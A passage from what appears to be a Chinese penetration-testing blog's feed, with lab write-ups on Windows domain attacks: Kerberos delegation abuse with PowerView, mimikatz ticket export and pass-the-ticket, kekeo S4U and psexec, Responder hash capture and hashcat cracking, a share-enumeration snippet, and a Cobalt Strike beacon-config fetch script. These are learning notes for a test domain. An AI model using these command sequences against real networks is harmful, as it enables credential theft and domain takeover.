0;</span><br><span class="line">        private enum NetError : uint</span><br><span class="line">        &#123;</span><br><span class="line">            NERR_Success = 0,</span><br><span class="line">            NERR_BASE = 2100,</span><br><span class="line">            NERR_UnknownDevDir = (NERR_BASE + 16),</span><br><span class="line">            NERR_DuplicateShare = (NERR_BASE + 18),</span><br><span class="line">            NERR_BufTooSmall = (NERR_BASE + 23),</span><br><span class="line">        &#125;</span><br><span class="line">        private enum SHARE_TYPE : uint</span><br><span class="line">        &#123;</span><br><span class="line">            STYPE_DISKTREE = 0,</span><br><span class="line">            STYPE_PRINTQ = 1,</span><br><span class="line">            STYPE_DEVICE = 2,</span><br><span class="line">            STYPE_IPC = 3,</span><br><span class="line">            STYPE_SPECIAL = 0x80000000,</span><br><span class="line">        &#125;</span><br><span class="line">        public static SHARE_INFO_1[] EnumNetShares(string Server)</span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;SHARE_INFO_1&gt; ShareInfos = new List&lt;SHARE_INFO_1&gt;();</span><br><span class="line">            int entriesread = 0;</span><br><span class="line">            int totalentries = 0;</span><br><span class="line">            int resume_handle = 0;</span><br><span class="line">            int nStructSize = Marshal.SizeOf(typeof(SHARE_INFO_1));</span><br><span class="line">            IntPtr bufPtr = IntPtr.Zero;</span><br><span class="line">            StringBuilder server = new StringBuilder(Server);</span><br><span class="line">            int ret = NetShareEnum(server, 1, ref bufPtr, MAX_PREFERRED_LENGTH, ref entriesread, ref totalentries, ref resume_handle);</span><br><span class="line">            if (ret == NERR_Success)</span><br><span class="line">            &#123;</span><br><span class="line">                IntPtr currentPtr = bufPtr;</span><br><span class="line">                for (int i = 0; i &lt; entriesread; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    SHARE_INFO_1 shi1 = (SHARE_INFO_1)Marshal.PtrToStructure(currentPtr, typeof(SHARE_INFO_1));</span><br><span class="line">                    ShareInfos.Add(shi1);</span><br><span class="line">                    currentPtr += nStructSize;</span><br><span class="line">                &#125;</span><br><span class="line">                NetApiBufferFree(bufPtr);</span><br><span class="line">                return ShareInfos.ToArray();</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                ShareInfos.Add(new SHARE_INFO_1(&quot;ERROR=&quot; + ret.ToString(), 10, string.Empty));</span><br><span class="line">                return ShareInfos.ToArray();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            SHARE_INFO_1[] computerShares = EnumNetShares(System.Net.Dns.GetHostName());</span><br><span class="line">            foreach (SHARE_INFO_1 computershare in computerShares) &#123;</span><br><span class="line">                Console.WriteLine(computershare);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这段代码其实是别人造好的轮子(这里面涉及到很多知识点，不一一展开讲了)，输出共享路径，不过方法要添加static属性，不然会报错，<a href="https://www.pinvoke.net/default.aspx/netapi32/NetShareEnum.html" title="https://www.pinvoke.net/default.aspx/netapi32/NetShareEnum.html" target="_blank" rel="noopener">参考</a><br>效果如下：<br><img src="/2020/12/22/sharpshares-code/share.png" alt></p><p>看过这些之后，再看看源码调用的逻辑就行了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;GitHub地址：&lt;a href=&quot;https://github.com/djhohnstein/SharpShares&quot; title=&quot;https://github.com/djhohnstein/SharpShares&quot; target=&quot;_blank&quot; rel=&quot;noo
      
    
    </summary>
    
    
    
      <category term="CSharp" scheme="http://sherlocz.github.io/tags/CSharp/"/>
    
  </entry>
  
  <entry>
    <title>约束委派攻击复现</title>
    <link href="http://sherlocz.github.io/2020/12/15/kerberos-constrained-delegation/"/>
    <id>http://sherlocz.github.io/2020/12/15/kerberos-constrained-delegation/</id>
    <published>2020-12-15T08:02:28.000Z</published>
    <updated>2020-12-16T09:40:48.958Z</updated>
    
    <content type="html"><![CDATA[<p>不清楚原理先来复现一下</p><p>测试环境如下：</p><ul><li>dc 192.168.43.100(域控)    administrator(域管)</li><li>Test08 192.168.43.110(域内机器) testuser(域内普通用户)</li><li>域 hacke.testlab</li></ul><h1 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h1><p>首先我们要设置test08机器有非约束委派的属性<br><img src="/2020/12/15/kerberos-constrained-delegation/test08.png" alt></p><p>我们可以使用powersploit中的<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" title="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" rel="noopener">脚本</a>来获取具有非约束委派的机器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1;</span><br><span class="line">Get-NetComputer -Unconstrained -Domain hacke.testlab</span><br></pre></td></tr></table></figure><p><img src="/2020/12/15/kerberos-constrained-delegation/powersploit.png" alt></p><p>使用域管账号访问Test08这台机器<br><img src="/2020/12/15/kerberos-constrained-delegation/dir1.png" alt></p><p>这个时候会在test08这台机器上的lsass.exe内存中留下留下票据信息</p><p>testuser用户登录test08这台机器，mimikatz导出票据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/admin.png" alt></p><p>这里可以看见有一个域管的票据，用mimikat导入进去<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;1f78b6]-2-0-60a10000-Administrator@krbtgt-HACKE.TESTLAB.kirbi</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/import.png" alt></p><p>这个时候在同一cmd下发现可以访问dc了<br><img src="/2020/12/15/kerberos-constrained-delegation/dcc.png" alt></p><p>可以利用psexec直接cmd过去</p><p><img src="/2020/12/15/kerberos-constrained-delegation/ipconfig.png" alt></p><p>域控就拿下了</p><h1 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h1><p>首先要将域用户委派设置为域控的cifs<br>test= testuser，一个是名称一个是登录名，懒得改了<br><img src="/2020/12/15/kerberos-constrained-delegation/cifs.png" alt></p><p>将testuser用户设置成服务账号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A SQLServer/test08.hacke.testlab/MSSQL testuser</span><br><span class="line">setspn -L testuser</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/service.png" alt></p><p>我们可以利用先前的powerview工具来查看域中的服务账号：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\powerview.ps1;Get-DomainUser -TrustedToAuth -Domain hacke.testlab | select name</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/test.png" alt></p><p>利用<a href="https://github.com/gentilkiwi/kekeo" title="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">kekeo</a>工具生成票据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:test /domain:hacke.testlab /password:xxxx</span><br><span class="line"></span><br><span class="line">tgs::s4u /tgt:TGT_testuser@HACKE.TESTLAB_krbtgt~hacke.testlab@HACKE.TESTLAB.kirbi /user:administrator@hacke.testlab /service:cifs/dc.hacke.testlab</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/kekeo.png" alt></p><p>mimikatz导入票据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_administrator@hacke.testlab@HACKE.TESTLAB_testuser@HACKE.TESTLAB.kirbi</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/mimikatz.png" alt><br>可以访问dc了</p><p>不过这种方法有前提条件，就是服务账号cifs设置的是域控的地址</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;不清楚原理先来复现一下&lt;/p&gt;
&lt;p&gt;测试环境如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;dc 192.168.43.100(域控)    administrator(域管)&lt;/li&gt;
&lt;li&gt;Test08 192.168.43.110(域内机器) testuser(域内普通用户)&lt;
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="http://sherlocz.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Responder在渗透测试中的利用</title>
    <link href="http://sherlocz.github.io/2020/12/14/Responder-Pentest/"/>
    <id>http://sherlocz.github.io/2020/12/14/Responder-Pentest/</id>
    <published>2020-12-14T04:42:47.000Z</published>
    <updated>2020-12-14T08:53:32.429Z</updated>
    
    <content type="html"><![CDATA[<p>#基本使用#</p><p>Github:<br><a href="https://github.com/lgandx/Responder-Windows" target="_blank" rel="noopener">https://github.com/lgandx/Responder-Windows</a><br>Kali自带<br>启用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/14/Responder-Pentest/start.png" alt><br>这里监听了这台kali，ip为192.168.43.105</p><p>使用域内其他机器访问kali的ipc，由于不存在，DNS解析不成功，回退到LLMNR和NBT-NS请求来解析目的地机器，这个时候responder会抓取到NTLMv2的hash</p><p><img src="/2020/12/14/Responder-Pentest/ipc.png" alt></p><p><img src="/2020/12/14/Responder-Pentest/hash.png" alt></p><p>抓取到的hash用<a href="https://github.com/hashcat/hashcat/releases/tag/v6.1.1" title="https://github.com/hashcat/hashcat/releases/tag/v6.1.1" target="_blank" rel="noopener">hashcat</a>解密。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/hashcat-6.1.1# ./hashcat.bin -m 5600 hash.txt pass.txt</span><br></pre></td></tr></table></figure><p>解出hash之后就可以用域用户登录了。<br><img src="/2020/12/14/Responder-Pentest/pass.png" alt></p><p>#钓鱼#<br>在Responder的配置文件中，我们可以找到html inject的相关信息<br><img src="/2020/12/14/Responder-Pentest/html.png" alt></p><p>将这个img标签新建到html中，访问<br><img src="/2020/12/14/Responder-Pentest/ip.png" alt></p><p>这里随意输入，然后点击确定，responder会接收到ntlm v2的hash<br><img src="/2020/12/14/Responder-Pentest/admin.png" alt></p><p>这里的hash并不是我们弹框输入的用户名密码的hash，而是对方机器的真实hash</p><p>#NTLMv2传递#<br>没复现成功<br>Waiting……</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#基本使用#&lt;/p&gt;
&lt;p&gt;Github:&lt;br&gt;&lt;a href=&quot;https://github.com/lgandx/Responder-Windows&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/lgandx/R
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>读取CS的beacon配置文件</title>
    <link href="http://sherlocz.github.io/2020/12/03/cs-checksum8/"/>
    <id>http://sherlocz.github.io/2020/12/03/cs-checksum8/</id>
    <published>2020-12-03T09:42:37.000Z</published>
    <updated>2020-12-03T10:52:14.266Z</updated>
    
    <content type="html"><![CDATA[<p>nmap脚本在这里：<br><a href="https://github.com/whickey-r7/grab_beacon_config" target="_blank" rel="noopener">https://github.com/whickey-r7/grab_beacon_config</a></p><p>我们可以看见这个url后面拼接的加密方式、感觉就是返回了4位数的随机数<br><img src="/2020/12/03/cs-checksum8/nse.png" alt></p><p>写成python脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">def generate_checksum(input):</span><br><span class="line">trial = &quot;&quot;</span><br><span class="line">total = 0</span><br><span class="line">i = 1</span><br><span class="line">while total != input:</span><br><span class="line">total = 0</span><br><span class="line">trial = &apos;&apos;.join(random.choice(&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;) for i in range(4))</span><br><span class="line">for i in range(4):</span><br><span class="line">total = (total + ord(trial[i])) % 256</span><br><span class="line">i = i + 1</span><br><span class="line">return trial</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">url_x86 = generate_checksum(92)</span><br><span class="line">print(url_x86)</span><br><span class="line">url_x64 = generate_checksum(93)</span><br><span class="line">print(url_x64)</span><br></pre></td></tr></table></figure></p><p>生成四位数的随机数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.75.170/KeVV</span><br></pre></td></tr></table></figure></p><p>可以下载下来beacon的配置文件，打开是二进制文件、网上找了几个cobaltstrikescan的脚本解析但是都没成功 ==</p><p>nmap脚本效果如下：<br><img src="/2020/12/03/cs-checksum8/nse.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;nmap脚本在这里：&lt;br&gt;&lt;a href=&quot;https://github.com/whickey-r7/grab_beacon_config&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/whickey-r7/gra
      
    
    </summary>
    
    
    
      <category term="CobaltStrike" scheme="http://sherlocz.github.io/tags/CobaltStrike/"/>
    
  </entry>
  
</feed>
